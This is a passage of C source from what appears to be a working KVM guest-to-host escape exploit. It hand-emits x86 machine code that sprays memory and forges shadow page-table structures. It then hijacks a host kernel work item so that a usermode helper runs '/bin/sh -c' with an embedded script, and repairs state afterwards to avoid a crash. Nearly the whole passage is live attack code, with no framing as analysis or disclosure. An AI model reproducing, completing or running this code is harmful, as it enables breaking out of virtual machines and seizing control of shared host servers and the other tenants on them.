		emit32_store_imm(&p, TARGET_C_BASE + off, 0);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 48u, KS_ZERO_LO, KS_ZERO_HI,
			       0);
	for (uint32_t off = 56u; off < 64u; off += 4u)
		emit32_store_imm(&p, TARGET_C_BASE + off, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 64u, 1u);
	for (uint32_t off = 68u; off < 152u; off += 4u)
		emit32_store_imm(&p, TARGET_C_BASE + off, 0);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 136u, KS_F_LO, KS_F_HI,
			       0x10);
	emit32_store_imm(&p, TARGET_C_BASE + 148u, TARGET_ROLE_INVALID);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 152u, KS_PAY_HVA_LO,
			       KS_PAY_HVA_HI, KHP_F + 24u);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 160u, KS_LOG_LO, KS_LOG_HI,
			       0);
	emit32_store_imm(&p, TARGET_C_BASE + 36u, 0);
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	emit32_store8_imm(&p, KS_ACTIVATION_ARM, 'A');
	*pp = p;
}

static void emit32_fail_block(uint8_t **pp, uint8_t stage);
static void emit32_wait_byte(uint8_t **pp, uint32_t addr, uint8_t value);
static void emit32_finish_c_splice(uint8_t **pp)
{
	uint8_t *p = *pp, *bad[96], *skip, *fail, *done;
	unsigned int nbad = 0;

	emit32_load_eax(&p, TARGET_C_BASE + 152u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, G1_MARKER + 64u);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 156u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, G1_MARKER + 68u);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 160u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, G1_MARKER + 64u);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 164u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, G1_MARKER + 68u);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 32u);
	e8(&p, 0x3d);
	e32(&p, 1u);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 36u);
	e8(&p, 0x3d);
	e32(&p, TARGET_ROLE_INVALID);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 64u);
	e8(&p, 0x3d);
	e32(&p, 1u);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 80u);
	e8(&p, 0x0b);
	e8(&p, 0x05);
	e32(&p, TARGET_C_BASE + 84u);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 48u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_ZERO_LO);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 52u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_ZERO_HI);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 128u);
	e8(&p, 0x0b);
	e8(&p, 0x05);
	e32(&p, TARGET_C_BASE + 132u);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_store_ptr_delta(&p, KS_EXPECT_LO, KS_F_LO, KS_F_HI, 0x10);
	emit32_load_eax(&p, TARGET_C_BASE + 136u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_LO);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 140u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_HI);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 148u);
	e8(&p, 0x3d);
	e32(&p, TARGET_ROLE_INVALID);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x8b);
	e8(&p, 0x3d);
	e32(&p, KS_PAY_GPA);
	emit32_store_ptr_delta(&p, KS_EXPECT_LO, KS_LOG_LO, KS_LOG_HI, 0);
	emit32_load_edi_eax(&p, KHP_F + 24u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_LO);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_edi_eax(&p, KHP_F + 28u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_HI);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_edi_eax(&p, KHP_F + 32u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_LO);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_edi_eax(&p, KHP_F + 36u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_HI);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_edi_eax(&p, KHP_W + 0u);
	e8(&p, 0x3d);
	e32(&p, (uint32_t)WORK_STRUCT_NO_POOL_VALUE);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_edi_eax(&p, KHP_W + 4u);
	e8(&p, 0x3d);
	e32(&p, (uint32_t)(WORK_STRUCT_NO_POOL_VALUE >> 32));
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_edi_eax(&p, KHP_W + 24u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_UMH_LO);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_edi_eax(&p, KHP_W + 28u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_UMH_HI);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	const uint32_t payload_ptrs[][2] = {
		{ KHP_W + 32u, KHP_COMPLETE },
		{ KHP_W + 40u, KHP_PATH },
		{ KHP_W + 48u, KHP_ARGV },
		{ KHP_W + 56u, KHP_ENVP },
	};
	for (unsigned int i = 0;
	     i < sizeof(payload_ptrs) / sizeof(payload_ptrs[0]); i++) {
		emit32_store_ptr_delta(&p, KS_EXPECT_LO, KS_PAY_HVA_LO,
				       KS_PAY_HVA_HI,
				       (int32_t)payload_ptrs[i][1]);
		emit32_load_edi_eax(&p, payload_ptrs[i][0]);
		e8(&p, 0x3b);
		e8(&p, 0x05);
		e32(&p, KS_EXPECT_LO);
		bad[nbad++] = emit_rel32_jcc(&p, 0x85);
		emit32_load_edi_eax(&p, payload_ptrs[i][0] + 4u);
		e8(&p, 0x3b);
		e8(&p, 0x05);
		e32(&p, KS_EXPECT_HI);
		bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	}
	const uint32_t argv_ptrs[][2] = {
		{ KHP_ARGV + 0u, KHP_ARG0 },
		{ KHP_ARGV + 8u, KHP_ARG1 },
		{ KHP_ARGV + 16u, KHP_SCRIPT },
	};
	for (unsigned int i = 0; i < sizeof(argv_ptrs) / sizeof(argv_ptrs[0]);
	     i++) {
		emit32_store_ptr_delta(&p, KS_EXPECT_LO, KS_PAY_HVA_LO,
				       KS_PAY_HVA_HI, (int32_t)argv_ptrs[i][1]);
		emit32_load_edi_eax(&p, argv_ptrs[i][0]);
		e8(&p, 0x3b);
		e8(&p, 0x05);
		e32(&p, KS_EXPECT_LO);
		bad[nbad++] = emit_rel32_jcc(&p, 0x85);
		emit32_load_edi_eax(&p, argv_ptrs[i][0] + 4u);
		e8(&p, 0x3b);
		e8(&p, 0x05);
		e32(&p, KS_EXPECT_HI);
		bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	}
	const uint32_t null_qwords[] = { KHP_ARGV + 24u, KHP_ENVP };

	for (unsigned int i = 0;
	     i < sizeof(null_qwords) / sizeof(null_qwords[0]); i++) {
		emit32_load_edi_eax(&p, null_qwords[i]);
		e8(&p, 0x85);
		e8(&p, 0xc0);
		bad[nbad++] = emit_rel32_jcc(&p, 0x85);
		emit32_load_edi_eax(&p, null_qwords[i] + 4u);
		e8(&p, 0x85);
		e8(&p, 0xc0);
		bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	}
	const uint32_t completion_zero_dwords[] = {
		KHP_COMPLETE + 0u,
		KHP_COMPLETE + 4u,
		KHP_COMPLETE + 12u,
	};
	for (unsigned int i = 0; i < sizeof(completion_zero_dwords) /
					     sizeof(completion_zero_dwords[0]);
	     i++) {
		emit32_load_edi_eax(&p, completion_zero_dwords[i]);
		e8(&p, 0x85);
		e8(&p, 0xc0);
		bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	}
	emit32_load_edi_eax(&p, KHP_COMPLETE + 8u);
	e8(&p, 0x3d);
	e32(&p, 1u);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_store_ptr_delta(&p, KS_EXPECT_LO, KS_PAY_HVA_LO, KS_PAY_HVA_HI,
			       KHP_COMPLETE + 16u);
	const uint32_t completion_links[] = { KHP_COMPLETE + 16u,
					      KHP_COMPLETE + 24u };
	for (unsigned int i = 0;
	     i < sizeof(completion_links) / sizeof(completion_links[0]); i++) {
		emit32_load_edi_eax(&p, completion_links[i]);
		e8(&p, 0x3b);
		e8(&p, 0x05);
		e32(&p, KS_EXPECT_LO);
		bad[nbad++] = emit_rel32_jcc(&p, 0x85);
		emit32_load_edi_eax(&p, completion_links[i] + 4u);
		e8(&p, 0x3b);
		e8(&p, 0x05);
		e32(&p, KS_EXPECT_HI);
		bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	}
	const struct {
		uint32_t off;
		const char *value;
	} payload_strings[] = {
		{ KHP_PATH, "/bin/sh" },
		{ KHP_ARG0, "sh" },
		{ KHP_ARG1, "-c" },
		{ KHP_SCRIPT, KHP_SCRIPT_TEXT },
	};
	for (unsigned int i = 0;
	     i < sizeof(payload_strings) / sizeof(payload_strings[0]); i++) {
		size_t len = strlen(payload_strings[i].value) + 1u;

		for (size_t j = 0; j < len; j += 4u) {
			uint32_t word = 0;
			size_t left = len - j;

			memcpy(&word, payload_strings[i].value + j,
			       left < 4u ? left : 4u);
			emit32_load_edi_eax(&p, payload_strings[i].off +
							(uint32_t)j);
			e8(&p, 0x3d);
			e32(&p, word);
			bad[nbad++] = emit_rel32_jcc(&p, 0x85);
		}
	}
	emit32_load_edi_eax(&p, KHP_W + 64u);
	e8(&p, 0x3d);
	e32(&p, 2u);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	skip = emit_rel32_jmp(&p);
	fail = p;
	emit32_fail_block(&p, 'i');
	done = p;
	for (unsigned int i = 0; i < nbad; i++)
		patch_rel32(bad[i], fail);
	patch_rel32(skip, done);
	emit32_store8_imm(&p, SPRAY_ARM + 26u, 'I');
	emit32_store8_imm(&p, KS_SPLICE_READY, 'L');
	emit32_store8_imm(&p, HOST_MONITOR_ENTER_GPA, 'M');
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	e8(&p, 0xb8);
	e32(&p, G1_MARKER);
	e8(&p, 0x31);
	e8(&p, 0xc9);
	e8(&p, 0x31);
	e8(&p, 0xd2);
	e8(&p, 0x0f);
	e8(&p, 0x01);
	e8(&p, 0xc8);
	uint8_t *monitor_return = emit_rel32_jmp(&p);

	patch_rel32(monitor_return, M + HOST_MONITOR_RETURN_TRAMPOLINE_GPA);
	uint8_t *wait = p;

	emit32_load_edi_eax(&p, KHP_W + 0u);
	e8(&p, 0x3d);
	e32(&p, (uint32_t)WORK_STRUCT_NO_POOL_VALUE);
	uint8_t *queued_lo = emit_rel32_jcc(&p, 0x85);

	emit32_load_edi_eax(&p, KHP_W + 4u);
	e8(&p, 0x3d);
	e32(&p, (uint32_t)(WORK_STRUCT_NO_POOL_VALUE >> 32));
	uint8_t *queued_hi = emit_rel32_jcc(&p, 0x85);

	e8(&p, 0xf3);
	e8(&p, 0x90);
	uint8_t *again = emit_rel32_jmp(&p);

	patch_rel32(again, wait);
	uint8_t *queued = p;

	patch_rel32(queued_lo, queued);
	patch_rel32(queued_hi, queued);
	emit32_store8_imm(&p, KS_WORK_QUEUED, 'Q');
	uint8_t *complete_ptr_wait = p;

	emit32_load_edi_eax(&p, KHP_W + 32u);
	e8(&p, 0x85);
	e8(&p, 0xc0);
	uint8_t *complete_low_nonzero = emit_rel32_jcc(&p, 0x85);

	emit32_load_edi_eax(&p, KHP_W + 36u);
	e8(&p, 0x85);
	e8(&p, 0xc0);
	uint8_t *complete_high_nonzero = emit_rel32_jcc(&p, 0x85);
	uint8_t *complete_ptr_seen = emit_rel32_jmp(&p);
	uint8_t *complete_ptr_retry = p;

	e8(&p, 0xf3);
	e8(&p, 0x90);
	uint8_t *complete_ptr_back = emit_rel32_jmp(&p);

	patch_rel32(complete_ptr_back, complete_ptr_wait);
	patch_rel32(complete_low_nonzero, complete_ptr_retry);
	patch_rel32(complete_high_nonzero, complete_ptr_retry);
	patch_rel32(complete_ptr_seen, p);
	uint8_t *work_rescue_bad[4];
	unsigned int nwork_rescue_bad = 0;

	emit32_atomic_install_edi64_abs(&p, KHP_W + 24u, KS_UMH_LO, KS_UMH_HI,
					KS_WORK_NOOP_LO, KS_WORK_NOOP_HI,
					work_rescue_bad, &nwork_rescue_bad);
	emit32_atomic_release_completion(&p, 'A', work_rescue_bad,
					 &nwork_rescue_bad);
	uint8_t *work_rescue_good = emit_rel32_jmp(&p);
	uint8_t *work_rescue_fail = p;

	emit32_fail_block(&p, 'v');
	for (unsigned int i = 0; i < nwork_rescue_bad; i++)
		patch_rel32(work_rescue_bad[i], work_rescue_fail);
	patch_rel32(work_rescue_good, p);
	uint8_t *completion_wait = p;

	emit32_load_edi_eax(&p, KHP_COMPLETE + 0u);
	e8(&p, 0x85);
	e8(&p, 0xc0);
	uint8_t *completion_nonzero = emit_rel32_jcc(&p, 0x85);

	e8(&p, 0xf3);
	e8(&p, 0x90);
	uint8_t *completion_back = emit_rel32_jmp(&p);

	patch_rel32(completion_back, completion_wait);
	patch_rel32(completion_nonzero, p);
	e8(&p, 0x3d);
	e32(&p, 1u);
	uint8_t *completion_exact = emit_rel32_jcc(&p, 0x84);

	emit32_store8_imm(&p, KS_DISARM_STATUS, 'f');
	patch_rel32(completion_exact, p);
	uint8_t *completion_unlock_wait = p;

	emit32_load_edi_eax(&p, KHP_COMPLETE + 8u);
	e8(&p, 0x85);
	e8(&p, 0xc0);
	uint8_t *completion_unlocked = emit_rel32_jcc(&p, 0x84);

	e8(&p, 0xf3);
	e8(&p, 0x90);
	uint8_t *completion_unlock_back = emit_rel32_jmp(&p);

	patch_rel32(completion_unlock_back, completion_unlock_wait);
	patch_rel32(completion_unlocked, p);
	emit32_load_edi_eax(&p, KHP_W + 68u);
	emit32_mark_eax_nonzero(&p);
	emit32_load_edi_eax(&p, KHP_W + 32u);
	emit32_mark_eax_nonzero(&p);
	emit32_load_edi_eax(&p, KHP_W + 36u);
	emit32_mark_eax_nonzero(&p);
	emit32_load_edi_eax(&p, KHP_W + 24u);
	emit32_mark_eax_ne_abs(&p, KS_WORK_NOOP_LO);
	emit32_load_edi_eax(&p, KHP_W + 28u);
	emit32_mark_eax_ne_abs(&p, KS_WORK_NOOP_HI);
	uint8_t *f_disarm_bad[4];
	unsigned int nf_disarm_bad = 0;

	emit32_atomic_install_edi64_zero(&p, KHP_F + 8u, KS_INIT_TASK_LO,
					 KS_INIT_TASK_HI, f_disarm_bad,
					 &nf_disarm_bad);
	emit32_atomic_install_edi64_abs(&p, KHP_F + 16u, KS_SRCU_LO, KS_SRCU_HI,
					KS_EP_AUTOREMOVE_LO,
					KS_EP_AUTOREMOVE_HI, f_disarm_bad,
					&nf_disarm_bad);
	uint8_t *f_disarm_good = emit_rel32_jmp(&p);
	uint8_t *f_disarm_fail = p;

	emit32_fail_block(&p, 'v');
	for (unsigned int i = 0; i < nf_disarm_bad; i++)
		patch_rel32(f_disarm_bad[i], f_disarm_fail);
	patch_rel32(f_disarm_good, p);
	emit32_load_edi_eax(&p, KHP_F + 8u);
	emit32_mark_eax_ne_abs(&p, KS_INIT_TASK_LO);
	emit32_load_edi_eax(&p, KHP_F + 12u);
	emit32_mark_eax_ne_abs(&p, KS_INIT_TASK_HI);
	emit32_load_edi_eax(&p, KHP_F + 16u);
	emit32_mark_eax_ne_abs(&p, KS_EP_AUTOREMOVE_LO);
	emit32_load_edi_eax(&p, KHP_F + 20u);
	emit32_mark_eax_ne_abs(&p, KS_EP_AUTOREMOVE_HI);
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	emit32_load_eax(&p, KS_DISARM_STATUS);
	e8(&p, 0x85);
	e8(&p, 0xc0);
	uint8_t *disarm_not_clean = emit_rel32_jcc(&p, 0x85);

	emit32_store8_imm(&p, KS_DISARM_STATUS, 'D');
	patch_rel32(disarm_not_clean, p);
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	emit32_store8_imm(&p, KS_UNLINK_ARM, 'U');
	emit32_wait_byte(&p, KS_UNLINK_ICR, 'I');
	emit32_store_ptr_delta(&p, KS_EXPECT_LO, KS_PAY_HVA_LO, KS_PAY_HVA_HI,
			       KHP_F + 24u);
	uint8_t *unlink_wait = p, *unlink_bad[4];

	emit32_load_edi_eax(&p, KHP_F + 24u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_LO);
	unlink_bad[0] = emit_rel32_jcc(&p, 0x85);
	emit32_load_edi_eax(&p, KHP_F + 28u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_HI);
	unlink_bad[1] = emit_rel32_jcc(&p, 0x85);
	emit32_load_edi_eax(&p, KHP_F + 32u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_LO);
	unlink_bad[2] = emit_rel32_jcc(&p, 0x85);
	emit32_load_edi_eax(&p, KHP_F + 36u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_HI);
	unlink_bad[3] = emit_rel32_jcc(&p, 0x85);
	uint8_t *unlink_ready = emit_rel32_jmp(&p);
	uint8_t *unlink_retry = p;

	e8(&p, 0xf3);
	e8(&p, 0x90);
	uint8_t *unlink_back = emit_rel32_jmp(&p);

	patch_rel32(unlink_back, unlink_wait);
	for (unsigned int i = 0; i < 4; i++)
		patch_rel32(unlink_bad[i], unlink_retry);
	patch_rel32(unlink_ready, p);
	emit32_store8_imm(&p, KS_UNLINK_DONE, 'X');
	e8(&p, 0x80);
	e8(&p, 0x3c);
	e8(&p, 0x25);
	e32(&p, KS_DISARM_STATUS);
	e8(&p, 'D');
	uint8_t *lifetime_bad = emit_rel32_jcc(&p, 0x85);

	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	emit32_store8_imm(&p, KS_UMH_COMPLETE, 'E');
	uint8_t *lifetime_good = emit_rel32_jmp(&p);
	uint8_t *lifetime_fail = p;

	emit32_fail_block(&p, 'u');
	patch_rel32(lifetime_bad, lifetime_fail);
	patch_rel32(lifetime_good, p);
	emit32_store8_imm(&p, SPRAY_ARM + 25u, 'Q');
	emit32_store8_imm(&p, SPRAY_ARM + 24u, 'W');
	e8(&p, 0xf4);
	*pp = p;
}

static void emit32_wait_byte(uint8_t **pp, uint32_t addr, uint8_t value)
{
	uint8_t *p = *pp, *loop = p;

	e8(&p, 0x80);
	e8(&p, 0x3d);
	e32(&p, addr);
	e8(&p, value);
	uint8_t *ready = emit_rel32_jcc(&p, 0x84);

	e8(&p, 0xf3);
	e8(&p, 0x90);
	uint8_t *again = emit_rel32_jmp(&p);

	patch_rel32(again, loop);
	patch_rel32(ready, p);
	*pp = p;
}

static void emit64_wait_byte(uint8_t **pp, uint32_t addr, uint8_t value)
{
	uint8_t *p = *pp, *loop = p;

	e8(&p, 0x80);
	e8(&p, 0x3c);
	e8(&p, 0x25);
	e32(&p, addr);
	e8(&p, value);
	uint8_t *ready = emit_rel32_jcc(&p, 0x84);

	e8(&p, 0xf3);
	e8(&p, 0x90);
	uint8_t *again = emit_rel32_jmp(&p);

	patch_rel32(again, loop);
	patch_rel32(ready, p);
	*pp = p;
}

static void emit32_fail_block(uint8_t **pp, uint8_t stage)
{
	emit32_store8_imm(pp, SPRAY_ARM + 48u, stage);
	emit_fail_stop_loop(pp);
}

static void emit32_require_stage2_zero(uint8_t **pp, uint8_t stage)
{
	uint8_t *p = *pp, *loop, *bad, *back, *skip, *done;

	e8(&p, 0xbe);
	e32(&p, SPRAY2_START);
	loop = p;
	e8(&p, 0x8b);
	e8(&p, 0x06);
	e8(&p, 0x0b);
	e8(&p, 0x46);
	e8(&p, 0x04);
	bad = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x83);
	e8(&p, 0xc6);
	e8(&p, 0x08);
	e8(&p, 0x81);
	e8(&p, 0xfe);
	e32(&p, SPRAY2_END);
	back = emit_rel32_jcc(&p, 0x82);
	patch_rel32(back, loop);
	skip = emit_rel32_jmp(&p);
	uint8_t *fail = p;

	emit32_fail_block(&p, stage);
	done = p;
	patch_rel32(bad, fail);
	patch_rel32(skip, done);
	*pp = p;
}

static void emit32_oracle_marker(uint8_t **pp, uint32_t marker_off,
				 bool save_base, uint8_t stage)
{
	uint8_t *p = *pp, *loop, *next, *back, *skip, *fail, *done;
	uint8_t *bad[8];
	unsigned int nbad = 0;

	e8(&p, 0xbe);
	e32(&p, SPRAY2_START);
	e8(&p, 0x31);
	e8(&p, 0xdb);
	e8(&p, 0x31);
	e8(&p, 0xff);
	loop = p;
	e8(&p, 0x8b);
	e8(&p, 0x06);
	e8(&p, 0x8b);
	e8(&p, 0x56);
	e8(&p, 0x04);
	e8(&p, 0x89);
	e8(&p, 0xc1);
	e8(&p, 0x09);
	e8(&p, 0xd1);
	next = emit_rel32_jcc(&p, 0x84);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_LO);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x3b);
	e8(&p, 0x15);
	e32(&p, KS_EXPECT_HI);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x43);
	e8(&p, 0x89);
	e8(&p, 0xf7);
	patch_rel32(next, p);
	e8(&p, 0x83);
	e8(&p, 0xc6);
	e8(&p, 0x08);
	e8(&p, 0x81);
	e8(&p, 0xfe);
	e32(&p, SPRAY2_END);
	back = emit_rel32_jcc(&p, 0x82);
	patch_rel32(back, loop);
	e8(&p, 0x83);
	e8(&p, 0xfb);
	e8(&p, 0x01);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x89);
	e8(&p, 0xf8);
	e8(&p, 0x25);
	e32(&p, 0xfffu);
	e8(&p, 0x3d);
	e32(&p, marker_off);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x81);
	e8(&p, 0xef);
	e32(&p, marker_off);
	if (save_base) {
		e8(&p, 0x89);
		e8(&p, 0x3d);
		e32(&p, KS_N_GPA);
	} else {
		e8(&p, 0x3b);
		e8(&p, 0x3d);
		e32(&p, KS_N_GPA);
		bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	}
	e8(&p, 0xc7);
	e8(&p, 0x87);
	e32(&p, marker_off);
	e32(&p, 0);
	e8(&p, 0xc7);
	e8(&p, 0x87);
	e32(&p, marker_off + 4u);
	e32(&p, 0);
	skip = emit_rel32_jmp(&p);
	fail = p;
	emit32_fail_block(&p, stage);
	done = p;
	for (unsigned int i = 0; i < nbad; i++)
		patch_rel32(bad[i], fail);
	patch_rel32(skip, done);
	*pp = p;
}

static void emit32_require_c_self(uint8_t **pp, uint8_t stage)
{
	uint8_t *p = *pp, *bad[4], *skip, *fail, *done;

	emit32_load_eax(&p, TARGET_C_BASE + 152u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, G1_MARKER + 64u);
	bad[0] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 156u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, G1_MARKER + 68u);
	bad[1] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 160u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, G1_MARKER + 64u);
	bad[2] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 164u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, G1_MARKER + 68u);
	bad[3] = emit_rel32_jcc(&p, 0x85);
	skip = emit_rel32_jmp(&p);
	fail = p;
	emit32_fail_block(&p, stage);
	done = p;
	for (unsigned int i = 0; i < 4; i++)
		patch_rel32(bad[i], fail);
	patch_rel32(skip, done);
	*pp = p;
}

static void emit32_arm_fake_c(uint8_t **pp, uint32_t a_lo, uint32_t a_hi,
			      int32_t a_delta, uint32_t b_lo, uint32_t b_hi,
			      int32_t b_delta, uint8_t pass)
{
	uint8_t *p = *pp;

	emit32_store_ptr_delta(&p, TARGET_C_BASE, G1_MARKER + 56u,
			       G1_MARKER + 60u, 0);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 8u, G1_MARKER + 40u,
			       G1_MARKER + 44u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 32u, 0x01ff0000u);
	emit32_store_imm(&p, TARGET_C_BASE + 36u,
			 TARGET_ROLE_INVALID_DIRECT_L1);
	emit32_store_imm(&p, TARGET_C_BASE + 40u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 44u, 0);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 48u, SAFE_SPT_HVA_LO,
			       SAFE_SPT_HVA_HI, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 56u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 60u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 64u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 68u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 72u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 76u, 0);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 80u, G1_MARKER + 64u,
			       G1_MARKER + 68u, -92);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 152u, a_lo, a_hi, a_delta);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 160u, b_lo, b_hi, b_delta);
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	emit32_store8_imm(&p, KS_PASS_ARM, pass);
	*pp = p;
}

static void emit32_repair_fake_c(uint8_t **pp, uint8_t pass)
{
	uint8_t *p = *pp;

	emit32_store_ptr_delta(&p, TARGET_C_BASE, G1_MARKER + 40u,
			       G1_MARKER + 44u, 0);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 8u, G1_MARKER + 56u,
			       G1_MARKER + 60u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 64u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 80u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 84u, 0);
	emit32_store8_imm(&p, KS_PASS_REPAIR, pass);
	*pp = p;
}

static void emit32_arm_pre_e_c(uint8_t **pp)
{
	uint8_t *p = *pp;

	emit32_store_imm(&p, TARGET_C_BASE + 32u, 0x01000101u);
	emit32_store_imm(&p, TARGET_C_BASE + 40u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 44u, 0);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 48u, SAFE_SPT_HVA_LO,
			       SAFE_SPT_HVA_HI, 0);
	for (uint32_t off = 56u; off < 64u; off += 4u)
		emit32_store_imm(&p, TARGET_C_BASE + off, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 64u, 1u);
	for (uint32_t off = 68u; off < 152u; off += 4u)
		emit32_store_imm(&p, TARGET_C_BASE + off, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 128u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 132u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 136u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 140u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 144u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 148u, TARGET_ROLE_INVALID);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 152u, G1_MARKER + 64u,
			       G1_MARKER + 68u, -24);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 160u, G1_MARKER + 64u,
			       G1_MARKER + 68u, -136);
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	emit32_store_imm(&p, TARGET_C_BASE + 36u, 0x81u);
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	emit32_store8_imm(&p, KS_C_PRE_E, 'A');
	*pp = p;
}

static void emit32_finish_pre_e_c(uint8_t **pp)
{
	uint8_t *p = *pp, *bad[28], *skip, *fail, *done;
	unsigned int nbad = 0;

	emit32_load_eax(&p, TARGET_C_BASE + 152u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, G1_MARKER + 64u);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 156u);
